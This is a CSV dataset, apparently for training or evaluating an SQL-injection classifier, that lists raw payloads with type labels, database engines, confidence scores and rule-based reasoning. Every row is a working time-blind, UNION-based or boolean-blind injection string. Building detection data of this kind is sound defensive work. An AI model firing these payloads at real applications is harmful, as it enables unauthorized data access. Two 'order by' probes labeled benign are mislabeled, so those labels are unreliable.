id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
2272,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dnmi"" like ""dnmi",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
2387,"1"" ) where 2702 = 2702 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
2248,1 ) as rlft where 1670 = 1670 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
2264,"-1676'|| ( select 'xzmu' from dual where 6373 = 6373 union all select 6373,6373--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
2277,-1432 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 17 chars.,2
2301,"-8382"" ) ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 23 chars.,2
2315,"1"" ) ) as aozi where 3354 = 3354 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
2342,1 ) ) waitfor delay '0:0:5' and ( ( 1636 = 1636,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
2202,-4684 ) as uqjn where 4550 = 4550 or 1689 = 5825,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
2207,1%' ) ) ) and 7219 = 7361 and ( ( ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
2208,"-2916"" ) ) or 4946 = 8232--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
2212,-7279 ) or 9898 = 9963 and ( 1481 = 1481,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
2223,"-8698"" where 1990 = 1990 or ( 8459 = 8459 ) *4906--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
2231,"-6279' ) union all select 3026,3026,3026,3026,3026,3026,3026,3026--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
2232,"-9566%"" ) union all select 7973,7973,7973,7973--",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
2235,"1 ) ) as debc where 7428 = 7428 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
2239,"-2549' ) as zfnf where 1993 = 1993 union all select 1993,1993,1993,1993,1993,1993--",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
2240,1 and 9412 = 6877#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
2242,"1%' ) ) ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
2244,1 ) and 8417 = 5276#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
2245,"-2140 ) ) union all select 8174,8174,8174#",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
2247,"-2167' ) ) ) union all select 3804,3804,3804,3804,3804,3804#",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
2253,"-7746' ) union all select 1998,1998,1998,1998,1998,1998,1998,1998#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
2256,"1'+ ( select kpso where 1226 = 1226 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 94 chars.,2
2258,-7231 ) ) union all select 7639#,union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
2262,"1' ) ) as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 96 chars.,2
2266,"-7611 ) as tuje where 6101 = 6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
2268,"-5625"" union all select 6087,6087,6087,6087,6087,6087--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
2270,"-7744"" ) ) ) union all select 9408,9408,9408,9408--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
2276,"-6496"" ) as obnf where 2903 = 2903 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,2
2280,"-5058%' union all select 6789,6789,6789,6789,6789#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
2283,-9405' union all select 2539--,union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
